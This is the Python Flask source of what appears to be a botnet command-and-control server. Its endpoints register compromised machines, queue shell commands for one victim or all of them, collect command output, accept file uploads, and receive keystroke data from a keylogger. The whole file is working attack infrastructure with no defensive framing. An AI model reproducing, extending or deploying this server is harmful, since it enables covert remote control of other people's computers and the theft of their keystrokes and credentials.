from flask import Flask, jsonify, abort, request
from datetime import datetime
from multiprocessing import Process
from uuid import uuid4
import os

nodes = []

host_name = "0.0.0.0"
port = 8099

app = Flask(__name__, static_folder="files")


@app.route("/init", methods=["POST"])
def init():
    data = request.json
    print(data)
    if not "id" in data or "os" not in data:
        abort(400)

    index = next((i for i, n in enumerate(nodes) if n["id"] == data["id"]), None)

    if index is None:
        nodes.append({'id': data['id'], 'os': data['os'], 'hostname': data['hostname'], 'commands': [], 'last_check': datetime.now(), 'buff': ''})

    return jsonify({"s": 1})


@app.route("/check", methods=["POST"])
def check():
    data = request.json
    if not "id" in data:
        abort(400)

    print(data)

    index = next((i for i, n in enumerate(nodes) if n["id"] == data["id"]), None)

    if index is None:
        return {"e": "init"}

    nodes[index]["last_check"] = datetime.now()

    if "buff" in data:
        nodes[index]["buff"] = nodes[index]["buff"] + data["buff"]

    commands = nodes[index]["commands"]

    nodes[index]["commands"] = []

    return jsonify({"commands": commands})


@app.route("/tools/upload", methods=["POST"])
def upload():
    file = request.files["file"]
    complete_filename = str(file.filename)
    print(complete_filename)
    extension = ""

    if "." in complete_filename:
        file_handle = "".join(complete_filename.split(".")[0:-1])
        extension = complete_filename.split(".")[-1]

    complete_filename = f"{file_handle}.{extension}"
    
    if complete_filename in os.listdir("files/"):
        complete_filename = f"{file_handle}-{uuid4()}.{extension}"

    file.save(f"files/{complete_filename}")
    return complete_filename


@app.route("/control/list", methods=["GET"])
def control_list():
    return jsonify(nodes)


@app.route("/control/buff/<id>", methods=["GET"])
def control_buff(id):
    i = next((i for i, n in enumerate(nodes) if n["id"] == id), None)

    if i is None:
        return {"e": "not found"}

    buff = nodes[i]["buff"]

    nodes[i]["buff"] = ""

    return jsonify({"buff": buff})


@app.route("/control/execute/all", methods=["POST"])
def control_execute_all():
    data = request.json
    if not "command" in data:
        abort(400)
    for node in nodes:
        node["commands"].append(data["command"])
    return jsonify({"s": 1})


@app.route("/control/execute/<id>", methods=["POST"])
def control_execute(id):
    data = request.json
    if not "command" in data:
        abort(400)

    id = request.view_args["id"]

    node = next((n for n in nodes if n["id"] == id), None)

    if node is None:
        return {"e": "not found"}

    node["commands"].append(data["command"])

    return jsonify({"s": 1})


@app.route("/keylogger/add_data", methods=["POST"])
def keylogger_add_data():
    data = request.json
    if not "hostname" in data or not "host" in data or not "data" in data:
        abort(400)

    keylogger_hostname = data["hostname"]
    keylogger_ip = data["host"]
    keylogger_buffer = data["data"]

    print(f"{keylogger_hostname} with ip {keylogger_ip} sent:\n {keylogger_buffer}")
    # TODO: Do something with this information

    return jsonify({"s": 1})


if __name__ == "__main__":
    app.run(host=host_name, port=port, debug=False, use_reloader=False)
